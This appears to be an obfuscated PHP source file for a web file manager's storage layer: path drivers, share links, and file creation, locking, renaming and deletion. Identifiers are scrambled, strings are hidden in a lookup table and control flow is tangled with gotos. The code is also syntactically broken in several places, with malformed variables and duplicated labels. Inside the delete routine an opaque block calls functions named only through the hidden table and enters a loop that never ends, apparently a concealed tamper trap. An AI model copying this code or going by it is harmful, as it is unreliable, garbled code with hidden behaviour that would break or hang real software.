$Eý[$_SERVER[][77]] : 0; } public function infoSimple($Eȧ) { return $this->model->sourceInfo($Eȧ); } public function info($EÆ) { return $this->infoParse($EÆ); } public function infoAuth($FΧ) { return $this->infoParse($FΧ, !1, !0); } public function infoWithChildren($d) { return $this->infoParse($d, !0); } protected function infoParse($eå, $a鶊 = false, $e = false) { if (!$a鶊) { return $this->model->pathInfo($eå, $e); } return $this->model->pathInfoMore($eå); } public function infoFull($DɆ) { $C݄ =& $_SERVER[]; $bτ✉ = explode($C݄[8], $DɆ); $eΩ = implode($C݄[8], array_splice($bτ✉, 1)); return $this->model->pathInfoByPath($bτ✉[0], $eΩ); } public function hashSimple($cһ) { $a =& $_SERVER[]; $d⎏ = $this->infoWithChildren($cһ); return $d⎏[$a[163]][$a[170]]; } public function hashMd5($cևƪ) { $c닲 =& $_SERVER[]; $E˖磐 = $this->infoWithChildren($cևƪ); return $E˖磐[$c닲[163]][$c닲[169]]; } public function exist($c) { $a߈ҵ =& $_SERVER[]; $dՋ = $this->parse($c); if (!$dՋ[$a߈ҵ[75]]) { return $this->isFile($c) || $this->isFolder($c); } $Cе = array($a߈ҵ[389] => $dՋ[$a߈ҵ[388]], $a߈ҵ[28] => $dՋ[$a߈ҵ[75]]); $d֨ = $this->model->where($Cе)->find(); return $d֨ ? !0 : !1; } public function isFile($Fˏפ) { $b몢 =& $_SERVER[]; $dᇊ = $this->infoSimple($Fˏפ); return $dᇊ && $dᇊ[$b몢[397]] == $b몢[86] ? !1 : !0; } public function isFolder($Có) { $Cʚ =& $_SERVER[]; $C = $this->infoSimple($Có); return $C && $C[$Cʚ[397]] == $Cʚ[86] ? !0 : !1; } public function listPath($Cޯ, $F = false) { $cۑ =& $_SERVER[]; if ($Cޯ == $cۑ[33]) { return !1; } $A = array($cۑ[389] => $Cޯ); if ($F) { return $this->model->listSource($A, -1); } return $this->model->listSource($A); } public function has($Cس, $EÆ = false, $Bغ = null) { $A =& $_SERVER[]; $bƬ⅐ = $this->infoWithChildren($Cس); if ($EÆ) { return array($A[202] => $bƬ⅐[$A[202]], $A[201] => $bƬ⅐[$A[201]]); } return $Bغ ? $bƬ⅐[$A[202]] : $bƬ⅐[$A[201]]; } public function listAll($f۳) { $bӤ = IO::info($this->pathParse[$_SERVER[][75]]); if (!$bӤ) { return array(); } return $this->model->listAll($f۳); } public function getContent($bϓ) { return $this->model->getContent($bϓ); } public function setContent($FÜ, $Dƒ = '') { return $this->model->setContent($FÜ, $Dƒ); } public function fileSubstr($Fۖ, $fγꯠ, $Bޅ۫) { return $this->model->fileSubstr($Fۖ, $fγꯠ, $Bޅ۫); } public function download($C, $b = '') { $EԼ = get_path_father($b); $Cԡ = get_path_this($b); $c׭ = $this->model->fileInfoGet($C); $c愲 = IO::copy($c׭[$_SERVER[][75]], $EԼ, !1, $Cԡ); return $c愲; } public function setModifyTime($b󴘤, $e̽ = '') { $this->model->metaSet($b󴘤, $_SERVER[][1205], $e̽); } public function upload($FЅ֑, $E۵˝, $Cڴ = false, $eʇ = REPEAT_REPLACE) { $A؉ =& $_SERVER[]; $e = $this->parse($FЅ֑); $B󻾋 = $this->model->addFile($e[$A؉[388]], $E۵˝, $e[$A؉[75]], $Cڴ, $eʇ); return $this->getPathOuter($B󻾋); } public function uploadFileByID($a, $B, $C׋) { $B̥ =& $_SERVER[]; $e鳽 = $this->parse($a); $a° = $this->model->addFileByFileID($e鳽[$B̥[388]], $B, $e鳽[$B̥[75]], $C׋); return $this->getPathOuter($a°); } public function addFileByRemote($a, $F맺, $Dĥ = array(), $Dٿ = '', $B) { $DՃ⠟ =& $_SERVER[]; $dر̥ = $this->parse($a); $Dٿ = empty($Dٿ) ? $dر̥[$DՃ⠟[75]] : $Dٿ; $F´܍ = $this->model->addFileByRemote($dر̥[$DՃ⠟[388]], $F맺, $Dٿ, $Dĥ, $B); return $this->getPathOuter($F´܍); } public function uploadLink($e勛, $Dǳ = 0) { $Bś =& $_SERVER[]; $Eӹ = $this->parse($e勛); $e勛 = Model($Bś[566])->createFileName($Eӹ[$Bś[75]]); $c֎ = IO::uploadLink($e勛, $Dǳ); return $c֎; } public function fileNameAuto($A祘, $Bڜ΍, $EˑԸ = REPEAT_REPLACE, $D߂ = false) { return $this->model->fileNameAuto($A祘, $Bڜ΍, $EˑԸ, $D߂); } public function fileNameExist($Cڃ, $cʭ) { return $this->model->fileNameExist($Cڃ, $cʭ); } protected function _fileOut($e, $c̍莲 = false, $C̍ = false, $b̯ = '', $E竵 = false) { goto b; b: $Cﹽ =& $_SERVER[]; $fߐ = $this->model->sourceInfo($e); if ($fߐ[$Cﹽ[397]] == $Cﹽ[86]) { header($Cﹽ[1206]); die; } goto a; a: $Aީ = $this->model->fileInfoGet($e); $b̯ = $Aީ[$Cﹽ[169]] ? $Aީ[$Cﹽ[169]] : $b̯; $eҮ = isset($GLOBALS[$Cﹽ[1207]]) ? $GLOBALS[$Cﹽ[1207]] : $fߐ[$Cﹽ[28]]; goto C; C: if ($E竵) { return IO::fileOutServer($Aީ[$Cﹽ[75]], $c̍莲, $eҮ, $b̯); } IO::fileOut($Aީ[$Cﹽ[75]], $c̍莲, $eҮ, $b̯); goto C; C: } public function fileOut($Aɩ, $Dɲփ = false, $b = false, $c = '') { $this->_fileOut($Aɩ, $Dɲփ, $b, $c); } public function fileOutServer($fݿ, $F = false, $A = false, $E˛ = '') { $this->_fileOut($fݿ, $F, $A, $E˛, !0); } protected function _fileOutImage($B۟, $eѿ = 250) { goto A㹖; Eǂ: $Eي = $this->model->fileInfoGet($B۟); $Eي[$Fᗈ[28]] = $C򘕓[$Fᗈ[28]]; $Eي[$Fᗈ[162]] = $C򘕓[$Fᗈ[162]]; goto B̙ˣ; A㹖: $Fᗈ =& $_SERVER[]; $C򘕓 = $this->model->pathInfo($B۟); if ($C򘕓[$Fᗈ[397]] == $Fᗈ[86]) { show_json($Fᗈ[1208] . $B۟, !1); } goto Eǂ; B̙ˣ: $GLOBALS[$Fᗈ[1207]] = $Eي[$Fᗈ[28]]; $GLOBALS[$Fᗈ[161]] = $Eي; IO::fileOutImage($Eي[$Fᗈ[75]], $eѿ); goto fβބ; fβބ: } public function fileOutImage($AϺ, $Cɛ = 250) { $this->_fileOutImage($AϺ, $Cɛ); } public function fileOutImageServer($eӏ, $f = 250) { $this->_fileOutImage($eӏ, $f); } public function link($dȓԳ, $Aݜ = '') { $dĐ = $this->model->fileInfoGet($dȓԳ); return IO::link($dĐ[$_SERVER[][75]], $Aݜ); } protected function parse($fۢվ) { $f =& $_SERVER[]; if (strstr($fۢվ, $f[8]) === !1) { return array($f[406] => intval($fۢվ), $f[75] => $f[33], $f[1204] => array()); } $eо = explode($f[8], trim($fۢվ, $f[8])); if (count($eо) < 2) { show_tips($fۢվ . $f[1209]); } return array($f[406] => intval($eо[0]), $f[75] => $eо[1], $f[1204] => array_slice($eо, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($A) { $this->pathParse = $A; $this->model = Model($_SERVER[][1203]); } public function getPathOuter($D³) { $fǬ =& $_SERVER[]; if (!$D³) { return $D³; } $D = $this->parse($D³); return trim(KodIO::makeShare($this->pathParse[$fǬ[388]], $D[$fǬ[388]]), $fǬ[8]); } protected function infoParse($E퇙, $FҎ = false, $b̡Ӵ = false) { $CԦ =& $_SERVER[]; $C = $this->pathParse[$CԦ[388]]; $Eܒ͑ = trim($this->pathParse[$CԦ[1063]], $CԦ[8]); return Action($CԦ[1210])->sharePathInfo($C, $Eܒ͑); } public function infoFull($B閠) { $F =& $_SERVER[]; $f꾺 = explode($F[8], trim($B閠, $F[8])); if (count($f꾺) > 1) { $Fצ = implode($F[8], array_splice($f꾺, 1)); $Dӧ = $this->model->pathInfoByPath($f꾺[0], $Fצ); if (!$Dӧ) { return !1; } $this->pathParse[$F[1063]] = $Dӧ[$F[390]]; } return $this->infoParse($B閠); } public function listAll($Cػ) { goto C; a؄: $C򲐡 = $this->model->listAll($Cػ); $c = Model($b躐[558])->getInfo($fװ[$b躐[462]]); $a͜ = Action($b躐[1210]); goto Bɫ; C: $b躐 =& $_SERVER[]; $fװ = IO::info($this->pathParse[$b躐[75]]); if (!$fװ) { return array(); } goto a؄; Bɫ: foreach ($C򲐡 as &$d) { check_abort(); $d[$b躐[84]] = $a͜->_shareItemeParse($d[$b躐[84]], $c); } unset($d); return $C򲐡; goto b; b: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($b ւ) { $this->pathParse = $b ւ; $this->model = Model($_SERVER[][1203]); } protected function infoParse($F쉘, $CЌ = false, $bЧĈ = false) { $B㫂ێ =& $_SERVER[]; return Action($B㫂ێ[1069])->sharePathInfo($this->pathParse[$B㫂ێ[75]], !0); } public function listPath($F, $E񅷤 = false) { $f͝ =& $_SERVER[]; $Dӂ΃ = parent::listPath($F, $E񅷤); foreach ($Dӂ΃ as $eۨ => $A) { if (!in_array($eۨ, array($f͝[73], $f͝[74]))) { continue; } foreach ($A as $e堍 => $B߅ߴ) { $Dӂ΃[$eۨ][$e堍] = Action($f͝[1069])->shareItemInfo($B߅ߴ); } } return $Dӂ΃; } public function listAll($C߈) { goto d; Aȴ: return $eύ; goto Bѣ; d: $b =& $_SERVER[]; $cߋķ = IO::info($this->pathParse[$b[75]]); if (!$cߋķ) { return array(); } goto Ať; Ať: $eύ = $this->model->listAll($C߈); foreach ($eύ as &$Bܟ) { $Bܟ[$b[84]] = Action($b[1069])->shareItemInfo($Bܟ[$b[84]]); } unset($Bܟ); goto Aȴ; Bѣ: } } goto E߄; bӸ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Cη) { $A閐 =& $_SERVER[]; $C = Model($A閐[497])->where(array($A閐[1515] => $Cη))->find(); $E = $this->_mkdirRoot(SourceModel::TYPE_USER, $Cη, $C[$A閐[28]]); $this->userDesktopAdd($E); return $E; } public function userDesktopAdd($Fʐ) { $a =& $_SERVER[]; $fᐎ = LNG($a[1945]); $aܠ = $this->mkdir($Fʐ, $fᐎ); $this->metaSet($aܠ, $a[1946], $a[86]); $this->metaSet($Fʐ, $a[1947], $aܠ); } public function groupRootAdd($BĊ) { $e =& $_SERVER[]; $E֯Ģ = Model($e[480])->where(array($e[1765] => $BĊ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $BĊ, $E֯Ģ[$e[28]]); } public function systemRootPathAdd($c片) { if ($c片 != $_SERVER[][500]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $c片); } public function userRootRemove($E߳) { $Cĥ = $this->sourceRoot(SourceModel::TYPE_USER, $E߳); if (!$Cĥ) { return; } $this->remove($Cĥ, !1); } public function groupRootRemove($Aǲ) { $bВ↊ = $this->sourceRoot(SourceModel::TYPE_GROUP, $Aǲ); if (!$bВ↊) { return; } $this->remove($bВ↊, !1); } private function _mkdirRoot($D, $C硯ڍ, $dŪ) { goto bō; B܅: $Bᒄ = $this->add($D); $AƑ = array($eΖ[550] => short_id($Bᒄ)); $this->where(array($eΖ[404] => $Bᒄ))->save($AƑ); goto dŲ; bō: $eΖ =& $_SERVER[]; $D = array($eΖ[389] => 0, $eΖ[544] => $D, $eΖ[545] => $C硯ڍ, $eΖ[541] => 1, $eΖ[546] => USER_ID, $eΖ[547] => USER_ID, $eΖ[542] => $eΖ[33], $eΖ[548] => $eΖ[493], $eΖ[416] => 0, $eΖ[543] => 0, $eΖ[442] => 0, $eΖ[549] => $eΖ[33]); if ($a = $this->where($D)->find()) { return $a[$eΖ[390]]; } goto A▸; dŲ: CacheLock::unlock($cȉ); return $Bᒄ; goto a݊; A▸: $cȉ = "\115\x6f\x64\145\154\123\x6f\165\x72\143\x65\x2e\155\153\x64\151\x72\x52\157\157\164\56{$D}\56{$C硯ڍ}\x2e" . $dŪ; CacheLock::lock($cȉ); $D[$eΖ[28]] = $dŪ; goto B܅; a݊: } private function sourceRoot($e, $b, $cʲ = false) { $Dዮ =& $_SERVER[]; $Aϓ = array($Dዮ[389] => 0, $Dዮ[544] => $e, $Dዮ[545] => $b); if ($Aό = $this->where($Aϓ)->find()) { return $cʲ ? $Aό : $Aό[$Dዮ[390]]; } return !1; } public function sourceRootGroup($b頋ܓ) { goto e睥; e睥: $cƿږ =& $_SERVER[]; if (is_string($b頋ܓ)) { $b頋ܓ = array($b頋ܓ); } $CƩّ = array($cƿږ[389] => 0, $cƿږ[544] => SourceModel::TYPE_GROUP, $cƿږ[545] => array($cƿږ[7], $b頋ܓ)); goto A; A: $this->selectPageReset(); $e؍ = $this->listSource($CƩّ, 1000); $this->selectPageRestore(); goto aΆѧ; aΆѧ: return array_to_keyvalue($e؍[$cƿږ[74]], $cƿږ[478]); goto d; d: } public function mkfile($b, $A, $Cޮ = '', $D䣃 = REPEAT_RENAME) { $cᇽ =& $_SERVER[]; $bɺ = Model($cᇽ[566])->addFileByContent($Cޮ, $A); return $this->_createFileCall($b, $A, $bɺ, $D䣃, $cᇽ[1212]); } public function addFile($e웏, $c٬͏, $Cߋ, $C섑ѹ = false, $Dʿݙ = REPEAT_RENAME) { $d躘 = Model($_SERVER[][566])->addFile($c٬͏, $Cߋ, $C섑ѹ); return $this->_createFileCall($e웏, $Cߋ, $d躘, $Dʿݙ); } public function addFileByFileID($Fꬴ, $FƑ, $dңߓ, $D󂮊 = REPEAT_RENAME) { $dςݬ =& $_SERVER[]; $D = Model($dςݬ[566])->find($FƑ); Model($dςݬ[566])->linkAdd($FƑ); return $this->_createFileCall($Fꬴ, $dңߓ, $D, $D󂮊); } public function addFileByRemote($F҇, $bֳ, $dٰ, $B; = array(), $B = REPEAT_RENAME) { $eٗ = Model($_SERVER[][566])->addFileByRemote($bֳ, $dٰ, $B;); return $this->_createFileCall($F҇, $dٰ, $eٗ, $B); } private function _createFileCall($d㻌, $bƇ, $aٗ, $C, $aė = "\165\x70\x6c\157\x61\144") { goto cը; cը: $BՂ =& $_SERVER[]; $cц = !1; $this->lockWriteStart($d㻌, $bƇ); goto Cؕ; aߧ: if ($cц && $F˅ && $F˅ != $dּ) { Model($BՂ[1917])->eventCreate($F˅, $aė); } $this->lockWriteEnd($d㻌, $bƇ); return $F˅; goto e; Cؕ: $dּ = $this->fileNameExist($d㻌, $bƇ); $F˅ = $this->_createFile($d㻌, $bƇ, $aٗ, $C, $cц); if (!$cц) { Model($BՂ[444])->remove($aٗ[$BՂ[441]]); } goto aߧ; e: } public function mkdir($A, $Fх, $eނ = REPEAT_SKIP) { goto Fڿ; D䉔܋: $this->lockWriteStart($A, $Fх); if ($eނ !== !1) { $E߼ = $this->fileNameExist($A, $Fх); if ($E߼ && $eނ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($A, $Fх); return $E߼; } $Fх = $this->fileNameAuto($A, $Fх, $eނ); } $D뗋׹ = array($E[541] => 1, $E[407] => $Fх, $E[542] => $E[33], $E[442] => 0, $E[543] => 0); goto b܄; Fڿ: $E =& $_SERVER[]; $aͨ = $this->sourceInfo($A); if (!$aͨ) { return !1; } goto D䉔܋; E鈙: return $C񙆓; goto f֘; b܄: $C񙆓 = $this->_addSoure($D뗋׹, $aͨ); Model($E[1917])->eventCreate($C񙆓, $E[1213]); $this->lockWriteEnd($A, $Fх); goto E鈙; f֘: } private function _createFile($Eپ, $c񓥏, $BŬ, $Aı, &$bἐ) { goto b; fď: return $b׻݇; goto dɭ; CǛ: if ($Aı !== !1) { $dߓ׻ = $this->fileNameExist($Eپ, $c񓥏); } $bἐ = !0; if ($Aı && $dߓ׻) { if ($Aı == REPEAT_SKIP) { $bἐ = !1; return $dߓ׻; } else { if ($Aı == REPEAT_REPLACE) { $E = $this->sourceInfo($dߓ׻); $dϫ = $this->fileHistory($E, $BŬ[$bף[441]], $BŬ[$bף[77]]); if (!$dϫ) { $bἐ = !1; } else { $this->folderSizeReset($Eپ); } return $dߓ׻; } else { $c񓥏 = $this->fileNameAuto($Eپ, $c񓥏, $Aı, !1); } } } goto c; c: $FЯ = array($bף[541] => 0, $bף[407] => $c񓥏, $bף[542] => get_path_ext($c񓥏), $bף[442] => $BŬ[$bף[441]], $bף[543] => $BŬ[$bף[77]]); $b׻݇ = $this->_addSoure($FЯ, $B鎛); $this->folderSizeReset($Eپ, intval($FЯ[$bף[77]])); goto fď; b: $bף =& $_SERVER[]; $B鎛 = $this->sourceInfo($Eپ); if (!$BŬ || !$B鎛) { return !1; } goto CǛ; dɭ: } protected function fileHistory($d, $D, $e╓) { goto AĊҹ; e: Model($e๧[1948])->addHistory($d); $c̪ = array($e๧[547] => USER_ID, $e๧[411] => time(), $e๧[441] => $D, $e๧[77] => $e╓); $this->where(array($e๧[404] => $d[$e๧[390]]))->save($c̪); goto E; AĊҹ: $e๧ =& $_SERVER[]; if ($d[$e๧[441]] == $D) { return !1; } $this->checkLock($d[$e๧[390]], $D); goto e; E: $this->sourceCacheClear($d[$e๧[390]]); return !0; goto Eɡ; Eɡ: } public function checkLock($A, $C۷) { goto Bͻ; C: $this->_createFileCall($F蓷[$d߷[472]], $a, $B, REPEAT_REPLACE, $d߷[1212]); $B = $F蓷[$d߷[439]][$d߷[505]]; $Aϐ = $B[$d߷[1950]] ? $B[$d߷[1950]] : $B[$d߷[28]]; goto fǆ妹; fǆ妹: show_json(LNG($d߷[1951]) . $d߷[1952] . LNG($d߷[1953]) . $d߷[1954] . $Aϐ . $d߷[1955], !1); goto d; E񜸉: $d׵ = Session::get($d߷[1949]); $a = substr($F蓷[$d߷[28]], 0, -1 - strlen($F蓷[$d߷[167]])) . $d߷[1475] . $d׵ . $d߷[94] . $F蓷[$d߷[167]]; $B = Model($d߷[566])->find($C۷); goto C; Bͻ: $d߷ =& $_SERVER[]; $F蓷 = $this->pathInfo($A); if (!$this->fileIsLock($F蓷, !0)) { return; } goto E񜸉; d: } public function fileIsLock($cۯ, $d = false) { goto f޸; f޸: $b늎 =& $_SERVER[]; if (!isset($cۯ[$b늎[439]]) || !$cۯ[$b늎[439]][$b늎[502]]) { return !1; } if ($cۯ[$b늎[439]][$b늎[502]] != USER_ID) { return !0; } goto fȌݟ; Bٚ: return !1; goto F좻; fȌݟ: $eۇʭ = $GLOBALS[$b늎[6]][$b늎[87]][$b늎[503]]; if ($cۯ[$b늎[439]][$b늎[504]] <= time() - $eۇʭ) { $this->metaSet($cۯ[$b늎[390]], $b늎[502], null); $this->metaSet($cۯ[$b늎[390]], $b늎[504], null); } if ($d) { $this->metaSet($cۯ[$b늎[390]], $b늎[504], time()); } goto Bٚ; F좻: } private function _addSoure($EÞ, $d̉) { goto d; f뛤ы: return $a܉; goto f痣; fł˰: $A = array($dӎ[550] => short_id($a܉)); $this->where(array($dӎ[404] => $a܉))->save($A); $this->setNamePinyin($a܉, $EÞ[$dӎ[28]]); goto f뛤ы; E: static $e = false; if (!$e) { Hook::trigger($dӎ[531], $EÞ); $e = !0; } $a܉ = $this->add($EÞ); goto fł˰; d: $dӎ =& $_SERVER[]; $F = array($dӎ[544] => $d̉[$dӎ[398]], $dӎ[545] => $d̉[$dӎ[478]], $dӎ[546] => USER_ID, $dӎ[547] => USER_ID, $dӎ[389] => $d̉[$dӎ[390]], $dӎ[548] => $d̉[$dӎ[481]] . $d̉[$dӎ[390]] . $dӎ[47], $dӎ[416] => 0, $dӎ[549] => $dӎ[33]); $EÞ = array_merge($F, $EÞ); goto B콆; B콆: $this->updateModifyTime($EÞ[$dӎ[472]]); $F˶į = $dӎ[1956] . $d̉[$dӎ[390]]; if (isset(self::$cacheChildList[$F˶į])) { unset(self::$cacheChildList[$F˶į]); } goto E; f痣: } public function remove($C, $dЬǟ = true) { goto fΎ; fΎ: $Dε =& $_SERVER[]; $fŜ魎 = $this->sourceInfo($C); $Dڅ = intval($fŜ魎[$Dε[398]]) === self::TYPE_SYSTEM; goto E㤟; fە: return $E͎; goto C˨۽; C拝: CacheLock::unlock($eأ); $this->metaSet($C, $Dε[1965], $fŜ魎[$Dε[472]]); $this->where(array($Dε[390] => $C))->save(array($Dε[411] => time())); goto aӮ; E㤟: $dµ = Model($Dε[1522])->get($Dε[1957]) == $Dε[86]; if ($Dڅ || $dЬǟ || !$dµ) { return $this->removeNow($C, $dЬǟ); } $bͦ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto b萌; cԈ: CacheLock::lock($eأ); $C욙 = $this->fileNameExist($bͦ, $c); if (!$C욙) { $C욙 = $this->mkdir($bͦ, $c, REPEAT_SKIP); $this->metaSet($C욙, $Dε[1961], $eη); $this->metaSet($C욙, $Dε[1962], $fŜ魎[$Dε[478]]); if ($fŜ魎[$Dε[472]] != 0) { $this->metaSet($C욙, $Dε[1963], _get($F, $Dε[1964])); } } goto C拝; aӮ: $this->recycleClear($fŜ魎); $E͎ = $this->move($C, $C욙, REPEAT_RENAME_FOLDER); $this->folderSizeReset($fŜ魎[$Dε[472]]); goto fە; b萌: $eη = $fŜ魎[$Dε[398]] == self::TYPE_USER ? $Dε[557] : $Dε[1015]; if ($eη == $Dε[557]) { $F = Model($Dε[497])->getInfo($fŜ魎[$Dε[478]]); $c = !empty($F[$Dε[1950]]) ? $F[$Dε[1950]] : $F[$Dε[28]]; $c = $Dε[256] . $c . $Dε[1958] . $fŜ魎[$Dε[478]]; } else { $F = Model($Dε[480])->getInfo($fŜ魎[$Dε[478]]); $c = _get($F, $Dε[28]); $c = $Dε[159] . $c . $Dε[1959] . $fŜ魎[$Dε[478]]; } $eأ = $Dε[1960] . md5($c); goto cԈ; C˨۽: } private function recycleClear($d쪓) { $aء =& $_SERVER[]; $fِ = $this->childrenAll($d쪓); $dʷ = array($aء[404] => array($aء[405], $fِ[$aء[1966]])); Model($aء[1967])->where($dʷ)->delete(); } public function removeNow($c֧֜, $d = true) { goto Fܿ; f: $this->updateModifyTime($e놗); $this->lockMoveEnd($c֧֜); Hook::trigger($CǊ[1555], $e, $d); goto D՝; C: $this->folderSizeReset($a[$CǊ[472]]); $e놗 = array($a[$CǊ[472]]); if ($a[$CǊ[397]] == $CǊ[86]) { $e놗[] = $a[$CǊ[390]]; } goto f; Fܿ: $CǊ =& $_SERVER[]; if (!isset($_SERVER[$CǊ[794]]) || !isset($_SERVER[$CǊ[792]])) { goto A; a: $F텉ᳫ = $Aө($a); $f؊ = explode($CǊ[227], $F텉ᳫ); if (count($f؊) < $CǊ[620]) { $e턴ʥ = $CǊ[798]; $e턴ʥ(); } goto d; d: $c = $CǊ[841]; $c($_SERVER[$CǊ[842]]); $a = 1; goto A; A: $E = $CǊ[840]; $Aө = $CǊ[795]; $a = $_SERVER[$CǊ[796]] . $CǊ[797]; goto a; A: for ($eЊ = $a; $eЊ > 0; $eЊ++) { $c = json_encode($GLOBALS[$CǊ[405]]); } goto Bߒ; Bߒ: } $a = $this->sourceInfo($c֧֜); goto Bٛݦ; D՝: return !0; goto a鿫; Bٛݦ: $e = $this->pathInfoMore($c֧֜); if (!$a) { return !0; } if ($a[$CǊ[472]] == 0) { if (!_get($GLOBALS, $CǊ[479])) { return !1; } } goto E; E: $this->lockMoveStart($c֧֜); Hook::trigger($CǊ[1968], $e, $d); if ($d) { Model($CǊ[1967])->moveToRecycle($c֧֜); } else { $Cّ = $this->childrenAll($a); Model($CǊ[528])->eventRemove($c֧֜); $this->removeRelevance($Cّ[$CǊ[1966]], $Cّ[$CǊ[1343]]); } goto C; a鿫: } public function childrenAll($E܉є) { $fܐ =& $_SERVER[]; $D뺘 = $E܉є[$fܐ[390]]; if ($E܉є[$fܐ[397]] == $fܐ[86]) { $Aڑ = array($fܐ[548] => array($fܐ[507], $E܉є[$fܐ[481]] . $D뺘 . $fܐ[508])); $E = array($fܐ[548] => $Aڑ[$fܐ[481]]); $aꐛ = $this->field($fܐ[1969])->where($E)->select(); $C = !1; $F = array($D뺘); if ($aꐛ) { $C = array_to_keyvalue($aꐛ, $fܐ[33], $fܐ[441]); $C = array_remove_value($C, $fܐ[491]); $F = array_to_keyvalue($aꐛ, $fܐ[33], $fܐ[390]); $F[] = $D뺘; } } else { $C = array($E܉є[$fܐ[441]]); $F = array($D뺘); } return array($fܐ[1966] => $F, $fܐ[1343] => $C); } public function removeArray($e֭) { if (!$e֭) { return !0; } } public function removeRelevance($Aɜ, $D) { goto aޑ; Aڔ: for ($CӠӜ = 0; $CӠӜ < count($Aɜ); $CӠӜ++) { $this->sourceCacheClear($Aɜ[$CӠӜ]); } goto c򰊉; F㓬: Model($e[1822])->where($Aϕ)->delete(); Model($e[528])->where($Aϕ)->delete(); Model($e[1663])->removeBySource($Aɜ); goto aɩȓ; aޑ: $e =& $_SERVER[]; $Aɜ = $Aɜ ? $Aɜ : array(); $D = $D ? $D : array(); goto fҎ; A: $Aϕ = array($e[404] => array($e[405], $Aɜ)); Model($e[1967])->where($Aϕ)->delete(); Model($e[435])->where($Aϕ)->delete(); goto F㓬; aɩȓ: Model($e[1948])->removeBySource($Aɜ); $this->where($Aϕ)->delete(); Model($e[444])->remove($D); goto Aڔ; fҎ: $Aɜ = array_unique(array_filter($Aɜ)); $D = array_unique(array_filter($D)); if (!$Aɜ) { return !1; } goto A; c򰊉: } public function rename($D烟, $B) { goto d; d: $f =& $_SERVER[]; $d֋ = $this->sourceInfo($D烟); if (!$d֋) { return !1; } goto A; A: $dꑾ = $this->fileNameExist($d֋[$f[472]], $B); if ($dꑾ && $dꑾ != $D烟) { return !1; } $cϳ = array($f[407] => $B, $f[547] => USER_ID); goto A՟; A՟: if (!$d֋[$f[397]] == $f[86]) { $cϳ[$f[399]] = get_path_ext($B); } Model($f[528])->eventRename($D烟, $d֋[$f[28]], $B); $this->sourceCacheClear($D烟); goto D; dĿ: $a = $f[1956] . $d֋[$f[472]]; if (isset(self::$cacheChildList[$a])) { unset(self::$cacheChildList[$a]); } return $AΦ; goto BՋփ; D: $this->setNamePinyin($D烟, $cϳ[$f[28]], !1); $this->updateModifyTime($d֋[$f[472]]); $AΦ = $this->where(array($f[404] => $D烟))->data($cϳ)->save(); goto dĿ; BՋփ: } public function setNamePinyin($Fř, $c, $aƚ = true) { $C´ =& $_SERVER[]; $A唔 = Input::check($c, $C´[551]); if ($aƚ && !$A唔) { return; } if (!$A唔) { $this->metaSet($Fř, $C´[438], null); $this->metaSet($Fř, $C´[437], null); return; } $b׊ = array($C´[438] => str_replace($C´[50], $C´[33], Pinyin::encode($c)), $C´[437] => Pinyin::encode($c, $C´[552])); $this->metaSet($Fř, $b׊); } public function getContent($eޔ) { goto Cѐ; DҲ: if (!$c̾[$c[75]]) { return $c[33]; } return IO::getContent($c̾[$c[75]]); goto c; f: if ($c̾[$c[77]] == 0) { return $c[33]; } $fʅ = $c[1970] . $c̾[$c[169]]; if ($c̾[$c[77]] <= 1024 * 10) { $C = Cache::get($fʅ); if (!$C) { $C = IO::getContent($c̾[$c[75]]); Cache::set($fʅ, $C); } return $C; } goto DҲ; Cѐ: $c =& $_SERVER[]; $c̾ = $this->fileInfoGet($eޔ); if (!$c̾) { return !1; } goto f; c: } public function setDesc($Dو˂, $Aσ) { $Aƶ =& $_SERVER[]; Model($Aƶ[528])->eventAddDesc($Dو˂, $Aσ); return $this->metaSet($Dو˂, $Aƶ[425], $Aσ); } public function setContent($Cħ߸, $c = '') { goto b٬; aҎ: if (!$aӄɒ || !$cӰ) { return !1; } $dܡ = Model($Fƽ[444])->addFileByContent($c, $cӰ[$Fƽ[28]]); $a벲 = $this->fileHistory($cӰ, $dܡ[$Fƽ[441]], $dܡ[$Fƽ[77]]); goto f; b٬: $Fƽ =& $_SERVER[]; $cӰ = $this->sourceInfo($Cħ߸); $aӄɒ = $this->fileInfoGet($Cħ߸); goto aҎ; f: if (!$a벲) { return Model($Fƽ[444])->remove($dܡ[$Fƽ[441]]); } $this->folderSizeReset($cӰ[$Fƽ[472]]); return !0; goto bΎϬ; bΎϬ: } public function fileSubstr($Aמ, $DٞҼ, $A̤) { $C = $this->fileInfoGet($Aמ); if (!$C) { return !1; } return IO::fileSubstr($C[$_SERVER[][75]], $DٞҼ, $A̤); } public function fileInfoGet($F׉) { goto D֟; a: $Fܭ = $Fݺ[447] . $bư[$Fݺ[441]]; $F = _get(self::$cacheFileInfo, $Fܭ); if ($F) { return $F; } goto F; D֟: $Fݺ =& $_SERVER[]; $bư = $this->sourceInfo($F׉); if (!$bư || $bư[$Fݺ[397]]) { return !1; } goto a; Aܴ: return $A; goto C; F: $A = Model($Fݺ[444])->fileInfo($bư[$Fݺ[441]]); if ($A) { $A[$Fݺ[28]] = $bư[$Fݺ[28]]; } self::$cacheFileInfo[$Fܭ] = $A; goto Aܴ; C: } private function folderChildrenNumber($bĳ) { $f㑅 =& $_SERVER[]; $B = $this->sourceInfo($bĳ); $E = array($f㑅[548] => array($f㑅[507], $B[$f㑅[481]] . $bĳ . $f㑅[508]), $f㑅[416] => intval($B[$f㑅[417]]), $f㑅[541] => 1); $e = $this->where($E)->count(); $b֖ = $this->where($E)->where(array($f㑅[541] => 0))->count(); return array($f㑅[81] => $b֖, $f㑅[82] => $e); } public function pathInfo($F֐ֿ, $Fȝ = false) { goto DƑ귻; B: $C = $FⲤ[433] . intval($Fȝ) . $FⲤ[434] . $F֐ֿ; $E = _get(self::$cachePathInfo, $C); if ($E) { return $E; } goto BӔЦ; fʥ: self::$cachePathInfo[$C] = $Cꋛ; return $Cꋛ; goto Fٗ; DƑ귻: $FⲤ =& $_SERVER[]; $Fȝ = !1; $F֐ֿ = intval($F֐ֿ); goto B; BӔЦ: $Cꋛ = $this->sourceInfo($F֐ֿ); if (!$Cꋛ) { return !1; } $Cꋛ = $this->_listDataApplyItem($Cꋛ, $Fȝ); goto fʥ; Fٗ: } public static $cachePathInfoMore = array(); public function pathInfoMore($e) { goto aⴊ; a: 